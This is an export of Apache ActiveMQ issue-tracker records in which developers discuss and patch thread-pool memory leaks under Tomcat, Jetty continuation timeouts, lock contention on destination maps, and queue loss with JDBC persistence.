If you need more information, please ask.",,gtully,lichtin,williamd,yrey,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-7021,,,,,,,,,,,,,"16/Aug/11 18:20;tabish;RWLockDestinations.txt;https://issues.apache.org/jira/secure/attachment/12490559/RWLockDestinations.txt","16/Aug/11 15:24;williamd;amq-config.zip;https://issues.apache.org/jira/secure/attachment/12490543/amq-config.zip","16/Aug/11 15:22;williamd;amq-dump;https://issues.apache.org/jira/secure/attachment/12490542/amq-dump",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60086,,,Mon Jun 09 11:38:32 UTC 2014,,,,,,,,,,,"0|i0agtr:",58999,,,,,,,,,,,,,,,,,,,,,"16/Aug/11 15:24;williamd;Broker configuration used for the test;;;","16/Aug/11 18:20;tabish;I was actually looking at that code yesterday and noticed that the locking on the destinationsMutex could result in unnecessary waits.  I am attaching a fix that I was testing, if you'd like to try it out just apply it to a trunk checkout and build your own broker.  ;;;","17/Aug/11 15:39;williamd;I want to test with activemq 5.5 base code so I should checkout the 5.5 tag right (activemq/tags/activemq-5.5.0) ?

Is it easy for you build a activemq-core-5.5.0.jar with your patch so that I will only have to replace the jar in the broker installation ?;;;","17/Aug/11 15:45;tabish;Easiest to apply to trunk and can't make any promises it will apply cleanly to 5.5 code.  The trunk code is quite a bit improved over 5.5 release so it'd be good to test there.  You will need to checkout the code and do a build via maven, which will create the broker distribution archives in the assembly/target folder.  You can extract those files and get access to the built Jars.;;;","17/Aug/11 16:01;williamd;ok I will try to patch 5.5. 

From what I understood from the patch, you change the synchronize by a ReentrantReadWriteLock. If the patch doesn't work I will try to modify it by myself.

Is it possible to ask for a patch on 5.5 if it works ?;;;","23/Aug/11 21:51;tabish;Fix applied to trunk, should show up in a SNAPSHOT build soon.  ;;;","24/Aug/11 08:18;williamd;I have made some tests on 5.5.0 (patch it myself) and it works better. 

But there is still a copy of the map when getDesinationMap() is called which can be heavy if you you have hundreds (or thousands) of topics and I think unnecessary since the Map is a ConcurrentHashMap that can handle concurrency if it is used properly.

Do you plan to release 5.6.0 soon ? I'll try to make the patch on 5.5 when I have some time.;;;","27/Nov/11 15:08;gtully;Think the hashmap copy is too much.;;;","27/Nov/11 16:52;dejanb;Just a note that after a brief look, it seems that only {{RegionBroker.getDestinationMap()}} method should be refactored, so we can remove a copy;;;","28/Nov/11 14:35;gtully;removed the copy from AbstractRegion (Region) .getDestinationMap

30% improvement on a simple non persistent send test with 10000 destinations.

http://svn.apache.org/viewvc?rev=1207224&view=rev;;;","28/Nov/11 16:00;williamd;Hi guys,

It's great you made improvement about performance by removing this unnecessary copy and thank your for taking into account my comment.

Do you plan to make a patch for 5.5.1 ? I'd like to have something proper in order to use it production. This gain of performance can really help me...

Or perhaps in 5.6.0, will it come out soon ?

Futhermore, in my understanding of getDestinationMap method, it is used to determine the presence of a destination and BrokerRegion class still makes a copy of queue's map and topic's map ? Tell me if I am wrong.... 

So, if I'm right about the hypothesis, can't you improve the performance again by adding a new method destinationExists(String destinationName) that just makes a containsKey in the hashmap. Thus we can also remove the copy in all the use cases in which you try to find out if a destination exists or not.

In any case, even a get() in multiple hashmap is better than a copy, specially when the hashmap is big.

Thanks.;;;","28/Nov/11 20:21;gtully;I think a copy is now only created when it is needed, so in cases where the map is modified to included more destinations. But please peek at the code and the call stacks or method usage and improve it.;;;","10/Jul/12 10:41;yrey;Hi,

looks like I faced that same issue with 5.5.0. and after doing basic verifications, I thought that the problem was still on 5.6.0, thus I started fixing 5.5.0 myself.

I just discovered about that fix in 5.6.0, but I think there is still room for improvement, thus I'd like to expose my ideas about fixing that issue:
- I did not work on the mutexes themselves, I'm not sure how much gain we can get by using different type of mutex, I believe not much as the trouble is not really on the mutexes but rather on the time it takes to make a copy of hash maps.
- I think the problem is rather that getDestinationMap should not be used at all in this case (I actually wonder why would it be ever needed. I did not check who uses it). AuthorizationBroker uses it only to test if a destination already exists.

Thus I simply added a method on the base class to do that check directly on the base hash map.

If you want I can send my patch.

Best Regards,
Yves.
;;;","10/Jul/12 11:21;gtully;@Yves, it is now ok to use org.apache.activemq.broker.region.Region#getDestinationMap b/c it does not involve a copy of the hashmap any more. It returns a direct reference to the underlying concurrent hash map.;;;","10/Jul/12 11:48;williamd;I have integrated those changes (first mutex and then the remove of the copy of the map) in a 5.5.1 and it works a lot better under load. This may not be the best pattern by it makes ActiveMQ usable and more performant.

I have tested the 2 fix successively and my findings are : 

* chaning mutex by read/write lock remove contentions between thread and improve performance a lot (no more red on theads  in jvisualwm)
* removing the copy of the map improve memory usage and performance

Tested with 2000 topics on a single broker with one message every 5 seconds. Without those fixes it wasn't performant.;;;","10/Jul/12 12:00;yrey;Hi Gary,

Yes, I saw your changes and I agree they will significantly reduce the contention on the mutex, but there is still a copy made in RegionBroker#getDestinationMap. That copy is now out of the mutex thus will not trigger contention, but is still much heavier than doing a hash lookup.
Also, since you are returning a reference of the map, I believe the read lock in getDestinationMap is likely useless. And I wonder that even if it is not the case currently, some code could modify the content of the returned map outside the mutex mechanism that guarantees integrity of the list of destinations.

Yves.
;;;","09/Jun/14 11:38;gtully;further update in http://git-wip-us.apache.org/repos/asf/activemq/commit/27b3a7c3
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Tomcat 6.0.32 complains that ActiveMQ 5.5 doesn't shutdown a thread,AMQ-3451,12518840,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,beowulf,beowulf,14/Aug/11 20:18,16/Feb/17 08:02,14/Jul/23 05:43,09/Sep/12 08:39,5.5.0,,,,,5.7.0,,,JMS client,,,,11,leak,resource,,,,,,,"Every time when restarting web application in Tomcat Manager I get messages:

SEVERE: The web application [/sms] appears to have started a thread named [ActiveMQ Task-3] but has failed to stop it. This is very likely to create a memory leak.

With every restart PermGen space is increased and finally i got OutOfMemory error for PermGen space.

I use Spring DefaultMessageListenerContainer, and it's shutdown method closes properly receivers threads. What is ""ActiveMQ Task-3"" thread and how to close it properly ?","jdk 1.6.0_23 for Linux 64 bit, Ubuntu 11.04
Tomcat 6.0.32
Spring 3.0.5
",aanno,aharris,candrews,ccorsi,davsclaus,garpinc,gtully,hidde,javich,liny,mbakhti,nilsga,nimmi,sgri,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4008,AMQ-4033,AMQ-6602,AMQ-2852,AMQ-3959,AMQ-3962,,,,,,,,,,,"03/Sep/12 12:05;davsclaus;AMQ-3451-broker.patch;https://issues.apache.org/jira/secure/attachment/12543537/AMQ-3451-broker.patch","03/Sep/12 13:40;davsclaus;AMQ-3451-broker2.patch;https://issues.apache.org/jira/secure/attachment/12543548/AMQ-3451-broker2.patch","04/Sep/12 10:50;davsclaus;AMQ-3541-3.patch;https://issues.apache.org/jira/secure/attachment/12543650/AMQ-3541-3.patch","04/Sep/12 10:50;davsclaus;activemq-core-5.7-SNAPSHOT.jar;https://issues.apache.org/jira/secure/attachment/12543651/activemq-core-5.7-SNAPSHOT.jar","03/Aug/12 12:15;sgri;inherited_access_cotrol_context_leak.png;https://issues.apache.org/jira/secure/attachment/12539034/inherited_access_cotrol_context_leak.png","03/Aug/12 13:15;sgri;patch.txt;https://issues.apache.org/jira/secure/attachment/12539044/patch.txt","02/Aug/12 21:18;sgri;transport_thread_leak.png;https://issues.apache.org/jira/secure/attachment/12538954/transport_thread_leak.png",,,,,,,,,,,,,,,7.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60650,,,Wed Sep 12 09:02:28 UTC 2012,,,,,,,,,,,"0|i0aj1z:",59360,,,,,,,,,,,,,,,,,,,,,"14/Aug/11 20:22;beowulf;My connection factory is declared in web.xml

<!-- Standalone ActiveMQ -->       
     <Resource name=""jms/connectionFactory"" auth=""Container"" type=""org.apache.activemq.ActiveMQConnectionFactory""
            description=""Repository JMS Connection Factory"" factory=""org.apache.activemq.jndi.JNDIReferenceFactory""
            brokerURL=""failover:(tcp://localhost:61616)?timeout=3000&amp;jms.redeliveryPolicy.maximumRedeliveries=2&amp;jms.redeliveryPolicy.initialRedeliveryDelay=3000L&amp;jms.redeliveryPolicy.useExponentialBackOff=false""
            brokerName=""LocalActiveMQBroker""/>;;;","15/Aug/11 10:41;beowulf;Duplicate of https://issues.apache.org/jira/browse/AMQ-2852;;;","15/Aug/11 10:41;beowulf;Duplicate;;;","15/Aug/11 10:47;beowulf;Linked a similar issue, not sure if this is a duplicate.;;;","01/Sep/11 14:48;gtully;does calling: org.apache.activemq.thread.DefaultThreadPools#shutdown work for you? I guess it would need to be part of a javax.servlet.ServletContextListener or called as part of the shutdown of your message listener container.
I guess we would need to include a little helper class to make it easier to configure.;;;","14/Sep/11 14:38;ravimbhatt;I am having similar issue where tomcat does not shut down properly because of activemq threads. 

I tried above solution org.apache.activemq.thread.DefaultThreadPools#shutdown, it does not help. I called this inside my contextDestroyed in tomcat, and it makes no difference to the situation.
;;;","14/Sep/11 14:39;ravimbhatt;and BTW i have tested this on tomcat 5, 6 and 7 with activemq 5.5.0

The situation happens only when there were messages on the queue and messages where being processed inside onMessage of a listener. If there are no messages on the queue, it shuts down properly if we call connection close etc in cotextDestroyed.;;;","17/Oct/11 01:23;javich;In my case the message appears regardless of the queue(s) being empty.

Using activemq 5.5 with camel 2.8 and spring 3.0.5 deployed to tomcat 6.0.32

Broker is set up locally using activemq camel component.

;;;","28/Oct/11 14:17;mbakhti;I have the same issue in Activemq 5.5. 
I tried :
 
broker.getTaskRunnerFactory().shutdown();
broker.getPersistenceTaskRunnerFactory().shutdown();
broker.stop();
broker.waitUntilStopped();
Scheduler.shutdown();

but it doesn't change anything 
;;;","16/Dec/11 09:39;andreas@apache.org;For me the following seems to work:

Interrupt the TCP transport socket handler daemon thread:

----

Index: activemq-core/src/main/java/org/apache/activemq/transport/tcp/TcpTransportServer.java
===================================================================
--- activemq-core/src/main/java/org/apache/activemq/transport/tcp/TcpTransportServer.java	(revision 1214868)
+++ activemq-core/src/main/java/org/apache/activemq/transport/tcp/TcpTransportServer.java	(working copy)
@@ -380,6 +380,8 @@
         if (serverSocket != null) {
             serverSocket.close();
         }
+        this.socketHandlerThread.interrupt();
+        this.socketHandlerThread = null;
     }
----

Shutdown the task runner factory in a servlet context listener:

----

public class CleanupAmqThreads implements ServletContextListener {

     @Override
         public void contextInitialized(ServletContextEvent sce) {
     }

     @Override
     public void contextDestroyed(ServletContextEvent sce) {
         DefaultThreadPools.getDefaultTaskRunnerFactory().shutdown();
     }
}
;;;","19/Dec/11 15:55;dejanb;Looked at some similar issue, and it seems to me it's just Tomcat doesn't like threads created for async closing of activemq connections. Try using URLs like

{code}failover:(tcp://localhost:61616?closeAsync=false){code}

and see if it helps.;;;","12/Jan/12 08:48;nilsga;Same problem, using Active MQ 5.5.1. Tried with ""closeAsync=false"" which didn't seem to make any difference.;;;","04/May/12 13:18;grambal;Hello,

Have you got a workaround to solve this issue ?

Sincerely;;;","13/Jul/12 07:30;liny;I have same issue after stop my application by Tomcat.
I don't know why ActiveMQ team doesn't fix it for a long time.;;;","17/Jul/12 02:09;liny;I crated a war to reproduce this issue. Please refer to http://activemq.2283324.n4.nabble.com/Old-issue-Memory-leak-after-stop-web-application-in-Tomcat-tp4653959p4654028.html. Hope this is helpful.;;;","17/Jul/12 09:44;gtully;@liny, thanks for that test case war. Peeking at the code, I think the problem is related to the code in com.foo.MainApplication#stop

That closes the connection, (returns them to the pool), but does not stop the connection pool. It does however stop the executors, and this prevents the real close of the connections when the spring context calls the custom stop destroy method. This is evident from the {{ERROR o.a.a.transport.tcp.TcpTransport - Could not stop service: tcp://foo.com/15.87.14.93:61616. Reason: java.util.concurrent.RejectedExecutionException}} exception.

So you can explicitly call close on the connection pool, like:
{code}conn.close();
((PooledConnectionFactory) springHelper.getBean(""pooledJmsFactory"")).stop();
DefaultThreadPools.getDefaultTaskRunnerFactory().shutdown();
DefaultThreadPools.shutdown();{code}
or somehow arrange it such that the calls to {{shutdown()}} are done when the spring context is destroyed. So after the connection pool is successfully destroyed.;;;","17/Jul/12 11:10;liny;@Gary 
Thanks for reply. Directly call below method in my stop() still can't work.
{noformat}
((PooledConnectionFactory) springHelper.getBean(""pooledJmsFactory"")).stop();
{noformat}
Please refer to http://activemq.2283324.n4.nabble.com/Old-issue-Memory-leak-after-stop-web-application-in-Tomcat-tp4653959p4654084.html for details.;;;","02/Aug/12 21:16;sgri;The problem is that when you put ActiveMQ libraries into Tomcat shared ""lib"" folder, then ActiveMQ  thread pool becomes shared between all web applications. When a web application sends a message, then a transport thread is created by a web application, then the thread is returned to the pool. Then the web application is undeployed,  the thread remains alive in the pool and can be re-used by another applicaiton. In results into a memory leak, because the thread is still alive after undeployment of web application and references the web application context classloader.;;;","02/Aug/12 21:18;sgri;Attached a screenshot with profiler which clearly shows a memory leak.;;;","02/Aug/12 21:23;sgri;However, when I removed ActiveMQ libraries from tomcat shared libraries and packaged them into WAR, the problem has gone because each web application now has its own ActiveMQ thread pool.;;;","02/Aug/12 21:27;sgri;You can't call org.apache.activemq.thread.DefaultThreadPools#shutdown when ActiveMQ libraries are in Tomcat shared libs, because calling that method will shutdown the shared thread pool, and  all other web application deployed to the same Tomcat will be unable to send any JMS messages. You can do that when ActiveMQ libraries are packaged into web application only.;;;","02/Aug/12 21:38;sgri;Whether you have a memory leak or not depends on how fast you re-load or re-deploy applications and how intense ActiveMQ is used by other web applications on the same tomcat. Sometimes ""ActiveMQ Transport"" or ""ActiveMQ Task"" thread is terminated by inactivity, and in that case you don't have a memory leak. Most of the time you have a memory leak when deploying ActiveMQ to Tomcat shared libs.;;;","03/Aug/12 07:10;sgri;The problem is in org.apache.activemq.thread.TaskRunnerFactory#executor. The thread pool's keepAliveTime is 30 seconds. If you have a single web application in Tomcat which uses JMS, and
 you re-start (or re-deploy) your web application in an interval less that 30 seconds, then the thread is not terminated and re-used, the thread references the undeployed web applicaiton classloader and JVM cannot collect undeployed application and free PermGen memory area.;;;","03/Aug/12 09:42;gtully;@Sergey this is great information

So the crux seems to be the classloader reference, if the pool is to be shared then it must not refer to an app specific loader. Do you understand the nature of that reference?

The alternative approach is to remove the use of the statically defined default task runner factory from client side code and use one per connection factory.;;;","03/Aug/12 10:42;sgri;@Gary

Yes, I understand the nature of the reference. When ActiveMQ thread pool creates a new thread, then the thread inherits the current thread context classloder. When the client web application is creating a JMS connection, then the context classloder is Tomcat WebAppClassLoader. As long as the thread is alive, it references web application classloader. The thread can be re-used by another web application while still holding a reference to the undeployed web application which created the thread.;;;","03/Aug/12 11:15;gtully;hmm, ok. so it sounds like a sensible fix is to clear and reset the tccl in the thread factory such that it is not inherited by the activemq task runner threads.
I just wonder if that behavior will break any clients, am thinking cxf and jaxb or in servicemix etc. It may need to be configurable via a system property just incase.
fancy taking a stab at a patch?;;;","03/Aug/12 11:33;sgri;Found another memory leak, see AMQ-3959;;;","03/Aug/12 12:01;sgri;@Gary

Ok, I will try to set tccl to null and then will run the memory profiler again.;;;","03/Aug/12 12:15;sgri;I have tried the patch below
-------------------------
Index: activemq-core/src/main/java/org/apache/activemq/thread/TaskRunnerFactory.java
===================================================================
--- activemq-core/src/main/java/org/apache/activemq/thread/TaskRunnerFactory.java       (revision 1366667)
+++ activemq-core/src/main/java/org/apache/activemq/thread/TaskRunnerFactory.java       (working copy)
@@ -108,6 +108,8 @@
                 Thread thread = new Thread(runnable, name + ""-"" + id.incrementAndGet());
                 thread.setDaemon(daemon);
                 thread.setPriority(priority);
+                thread.setContextClassLoader(null);
                 return thread;
             }
         });
-------------------------

Still have memory leak, now because of inherited access control context, see the screenshot.

;;;","03/Aug/12 13:15;sgri;Attached a patch which cleans the thread's context classloader and inherited security context.;;;","03/Aug/12 14:03;liny;Hi,

Is the solution is one of bellows?
1. Killed all sessions, wait more than 30 secs, then thread pool will kill himself.
2. Use patch.txt
;;;","03/Aug/12 14:26;liny;@Sergey

No, I didn't put ActiveMQ Lib in tomcat share lib directory. So your solutions work, right? If yes, really appreciated. I'll try soon!;;;","03/Aug/12 14:34;sgri;@liny

I you didn't put ActiveMQ lib in tomcat shared lib, then I don't understand why you have a memory leak, because when I package ActiveMQ libs to WEB-INF/lib, then I don't have any memory leaks except AMQ-3959. 
You need to deploy your web application, then stop it in Tomcat Manager, then use Eclipse Memory Analysis tool, take a heap dump, open histogram, group by clasloader, then find paths to GC root for WebAppClassLoader. When done, you will know for sure the cause of  the memory leak.;;;","03/Aug/12 14:49;liny;@Sergey

My situation is described at http://activemq.2283324.n4.nabble.com/Old-issue-Memory-leak-after-stop-web-application-in-Tomcat-tp4653959p4654028.html with a simple web app. Would you like to try to see if you can see the same problem like me? Eclipse Memory Analysis looks a good tool, will try it.;;;","03/Aug/12 15:09;sgri;@liny

I have downloaded the application from https://docs.google.com/open?id=0B-ZFcczN9qxYZmh5dDdoMFVCUkE, and analyzed the heap dump.

I don't see any memory leaks related to threads, the only memory leak with your web application is  AMQ-3959;;;","07/Aug/12 16:08;ccorsi;@Sergey

The issue is more fundamental than your patch.  Those threads are created by the default task runner factory and this factory is created once and then never shutdown throwout the life time of the process. 

Adding a shutdown of the default task runner will remove this issue but will raise another issue when using the shared classloader of the application server with multiple containers.

The default task runner should be associated with the broker server and not a self contained static class.  This should resolve the case of its use within the broker side code but will not resolve this issue within the client side issue.  That needs a little more work on getting this to work properly.

I have tried to shutdown the default task runner factory fix but when I hot deploy the container again.  It raises a rejected exception when trying to add a task to the runner since this executor has been shutdown already.

I tried a fix to associates a default task runner factory to the broker and that resolved the issue I was initially seeing.

I still have an issue with the client code that uses the default task runner factory.  This still needs work on my end and will probably require a different fix that would provide a similar solution.  I was thinking about using WeakReferences associated with a ReferenceQueue.  Whenever the remove method is called the task runner factory can be shutdown.  This might work.  I just need to implement this.

--Claudio
;;;","31/Aug/12 16:48;nimmi;When can we expect a solution to this issue ? We are facing the same issue on Tomcat7 as well.;;;","03/Sep/12 08:41;davsclaus;If people only run 1 broker in the JVM, we could as a temporary fix, add some flag/option/whatever to tell the broker, to shutdown these thread pools when the BrokerService is shutdown.

Its of course a bit tricker when its a JMS client, as that would be some stop logic in a ConnectionFactory or the likes, to get a callback when to shutdown.
;;;","03/Sep/12 08:57;davsclaus;The org.apache.activemq.thread.DefaultThreadPools seems to be used in 2 areas
- by the broker a bit
- transports

The code for the broker, can be refactored to use a broker specific executor, so when the broker shutdown, those threads will be shutdown as well. That should be doable

The transports can be used by JMS clients as well, so I wonder as Gary says, can we use a dedicated thread pool (executor service) *per* transport?
If that would be doable, then we have start|stop callbacks on the transports, where we can ensure the thread pool is setup / shutdown properly.;;;","03/Sep/12 12:05;davsclaus;I have attached a patch to fix the part that is used by the broker, to use the executor the broker itself provides.

Anyone see a problem with that? The unit tests passes, and a brief spin of running a standalone broker seems fine.

;;;","03/Sep/12 12:50;nimmi;Hello Claus,

Would it be possible to attach the updated ActiveMQ jar please.Also let me know which version of ActiveMQ are you using.
I am trying the 5.7.snapshot since it has the new DefaultThreadPools.getDefaultTaskRunnerFactory().shutdown(); method but still Tomcat7 fails to shutdown cleanly.;;;","03/Sep/12 13:17;davsclaus;The ASF CI server will once in a while deploy a new SNAPSHOT you can download. Keep an eye on
https://builds.apache.org/job/ActiveMQ-Trunk-Deploy/

The attached patch only fixes on the broker side, there is still all the transports. I am continuing on the patch, taking one step at a time. Currently testing with 2 more fixes for discover agent and another place. Then next is the remainder 7 transports using it.;;;","03/Sep/12 13:40;davsclaus;Patch with more fixes. Only the transports to go now.;;;","03/Sep/12 14:50;nimmi;Thank you very much for working on this issue.I'll check the builds page.;;;","04/Sep/12 09:18;davsclaus;Okay got as far with a JMS client in Tomcat now not reporting any leaks from its console, when I stop the app or redeploy it.
> 
Message: 	
No web applications appear to have triggered a memory leak on stop, reload or undeploy.;;;","04/Sep/12 09:21;davsclaus;With an embedded AMQ broker I still get this

> The following web applications were stopped (reloaded, undeployed), but their
classes from previous runs are still loaded in memory, thus causing a memory
leak (use a profiler to confirm):
/camel-example-activemq-tomcat;;;","04/Sep/12 10:50;davsclaus;Patch with transport connections fixes. I also attached the core JAR for people to give a try. The other SNAPSHOT jars are in maven snapshot repo, where you can download them. As no fixes has yet been committed to the codebase.;;;","04/Sep/12 14:38;davsclaus;I discovered a leak in Camel, when JMX is enabled. 
https://issues.apache.org/jira/browse/CAMEL-5564;;;","05/Sep/12 16:30;davsclaus;First part of patch is committed to the code base. The connector/transport code need a bit more love, as they tend to either create the pools in ctr / start or stop lifecycle methods. The code could possible be more consistent among them.;;;","06/Sep/12 17:57;davsclaus;Okay AMQ-4026 is now committed, so we have a better API for shutting down thread pools. Will work on getting the patches in the codebase, so the JMS Client work well in Tomcat when re-deploying apps. 

A fully embedded ActiveMQ broker in Tomcat has a number of more pools and other parts in the works, eg such as JMX and whatnot that can cause a bit pain, eg to ensure all JMX stuff is properly unregistered and whatnot. 

First priority is the JMS client though.;;;","07/Sep/12 12:00;davsclaus;Okay got the JMS client leak fixed and committed to trunk. No leaks reported by Tomcat, and the WebappClassLoader did not have any strong references to any classes anymore. So seems we can fully undeploy/redeploy without leaks now.;;;","07/Sep/12 14:50;davsclaus;Okay got further on the embedded broker side. Got a classloader leak fixed due a spring introspection cache, needed to be explicit cleared.
The tomcat manager console now says there is no leaks. And all activemq and camel classes is fully unloaded when stopping the app.

One last thing would be a JMX thread not being shutdown on the broker side.;;;","07/Sep/12 18:14;nimmi;We tried the 6th September build and our issues with ActiveMQ task runner threads have been fixed.Thank you.
When can we expect the official version of ActiveMQ-5.7 to be released ?
Also could anybody please comment on AMQ-4030.;;;","09/Sep/12 08:39;davsclaus;I created AMQ-4033 for the issue with the embedded AMQ broker. The JMS client now shutdown all the threads, and can be unloaded by the classloader etc.

About the AMQ 5.7 release, then this should be discussed at the AMQ mailing list such as either the dev or user.;;;","12/Sep/12 09:02;nimmi;ok,thank you.Will mail the user mailing list.;;;"
"When MessageListenerServlet is running under servlet3, the continuation is not timing out.",AMQ-3447,12518599,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jackygurui,jackygurui,11/Aug/11 15:22,19/Jun/13 16:28,14/Jul/23 05:43,19/Jun/13 16:28,5.5.0,,,,,5.9.0,,,,,,,1,Ajax,,,,,,,,"In MessageListenerServlet.java

          if (message == null && client.getListener().getUndeliveredMessages().size() == 0) {
                Continuation continuation = ContinuationSupport.getContinuation(request);
                
                if (continuation.isExpired()) {
                    response.setStatus(HttpServletResponse.SC_OK);
                    StringWriter swriter = new StringWriter();
                    PrintWriter writer = new PrintWriter(swriter);
                    writer.println(""<ajax-response>"");
                    writer.print(""</ajax-response>"");

                    writer.flush();
                    String m = swriter.toString();
                    response.getWriter().println(m); 
                    
                    return;
                }

                continuation.setTimeout(timeout);
                continuation.suspend();
                LOG.debug( ""Suspending continuation "" + continuation );
                
                // Fetch the listeners
                AjaxListener listener = client.getListener();
                listener.access();

                // register this continuation with our listener.
                listener.setContinuation(continuation);
                
                return;
            }

Based on above code, the continuation is expected to be expired after given timeout when there is no message available for the ajax client and the ajax client will then receive an ""empty"" message. However based on the servlet 3 Continuation implementation in jetty (Servlet3Continuation.java) the only place where the continuation is set to expire is within the below method (there is a bug in this method as well). 

public void addContinuationListener(final ContinuationListener listener)
    {
        AsyncListener wrapped = new AsyncListener()
        {
            public void onComplete(final AsyncEvent event) throws IOException
            {
                listener.onComplete(Servlet3Continuation.this);
            }

            public void onError(AsyncEvent event) throws IOException
            {
                listener.onComplete(Servlet3Continuation.this);
            }

            public void onStartAsync(AsyncEvent event) throws IOException
            {
                event.getAsyncContext().addListener(this);
            }

            public void onTimeout(AsyncEvent event) throws IOException
            {
                _expired=true;
                listener.onTimeout(Servlet3Continuation.this);
            }
        };
        
        if (_context==null)
            _context.addListener(wrapped);
        else
            _listeners.add(wrapped);
    }

Without adding a listener the continuation will never be set to expire, therefore the ""empty"" response is never sent back to the client, the connection from the client is resumed and suspended over and over again until the connection is aborted by client or there is a message available.",Ubuntu 11.04 using glassfish as web container running servlet 3.0 webapp.,tabish,themel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,65457,,,Wed Jun 19 16:28:50 UTC 2013,,,,,,,,,,,"0|i0eajz:",81472,,,,,,,,,,,,,,,,,,,,,"13/Jun/13 16:04;themel;This looks like it's actually a bug in Jetty's continuation support, but in the mean time, here's a workaround:

--- MessageListenerServlet.java.orig    2013-02-06 15:13:06.000000000 +0100
+++ MessageListenerServlet.java 2013-06-13 17:17:43.562011800 +0200
@@ -41,6 +41,7 @@

 import org.apache.activemq.MessageAvailableConsumer;
 import org.eclipse.jetty.continuation.Continuation;
+import org.eclipse.jetty.continuation.ContinuationListener;
 import org.eclipse.jetty.continuation.ContinuationSupport;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -307,13 +308,29 @@

             if (message == null && client.getListener().getUndeliveredMessages().size() == 0) {
                 Continuation continuation = ContinuationSupport.getContinuation(request);
+
+               // Add a listener to the continuation to make sure it actually
+               // will expire (seems like a bug in Jetty Servlet 3 continuations, see https://issues.apache.org/jira/browse/AMQ-3447
+               continuation.addContinuationListener(new ContinuationListener() {
+                       @Override public void onTimeout(Continuation cont) {
+                               if (LOG.isDebugEnabled()) {
+                                       LOG.debug(""Continuation "" + cont.toString() + "" expired."");
+                               }
+                       }
+                       @Override public void onComplete(Continuation cont) {
+                               if (LOG.isDebugEnabled()) {
+                                       LOG.debug(""Continuation "" + cont.toString() + "" completed."");
+                               }
+                       }
+               });
+

                 if (continuation.isExpired()) {
                     response.setStatus(HttpServletResponse.SC_OK);
                     StringWriter swriter = new StringWriter();
                     PrintWriter writer = new PrintWriter(swriter);
;;;","19/Jun/13 08:04;themel;Acknowledged as a Jetty bug, fixed in HEAD: https://bugs.eclipse.org/bugs/show_bug.cgi?id=410911;;;","19/Jun/13 16:28;tabish;Patch applied on trunk, for v5.9.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jdbcPersistenceAdapter will lose existing queues after a broker restart,AMQ-3445,12518473,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,rasitha1,rasitha1,10/Aug/11 16:23,02/May/13 02:29,14/Jul/23 05:43,08/Feb/12 15:29,5.4.2,5.5.0,,,,,,,Broker,,,,0,,,,,,,,,"When using jdbcPersistenceAdapter, if you restart the broker queues do not show up until they are manually created or a consumer re-connects. This is especially a problem for Virtual Topic consumers - for Virtual Topic consumers once the queue is created (and thereby subscribing to the virtual topic), they should get all messages published to the topic until consumer explicitly remove subscription by deleting the queue. With KahaDB this works correctly but not with jdbcPersistenceAdapter. Tried both 5.4.2 and 5.5 and both have the same issue.


To reproduce:
1. Setup broker using jdbcPersistenceAdapter 
2. Go to web console and create a queue: Consumer.MyApp.VirtualTopic.FOO
3. Go to topics page and create a topic: VirtualTopic.FOO
4. Send a message with Persistent Delivery to the topic
5. Verify queue has the message
6. Restart the broker
7. BUG: queue does not show up
8. Go to topics page and repeat steps 3 & 4
9. repeat step 2
10. BUG: only the first message shows up in the queue.

Do the same test on KahaDB and queue shows up in step 7 (and because of that) you get both messages in step 10.
 ",,rasitha1,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3695,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,65571,,,Wed Feb 08 15:29:31 UTC 2012,,,,,,,,,,,"0|i0ebuf:",81681,,,,,,,,,,,,,,,,,,,,,"08/Feb/12 15:29;tabish;Added a test case for you, works fine using 5.6-SNAPSHOT.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
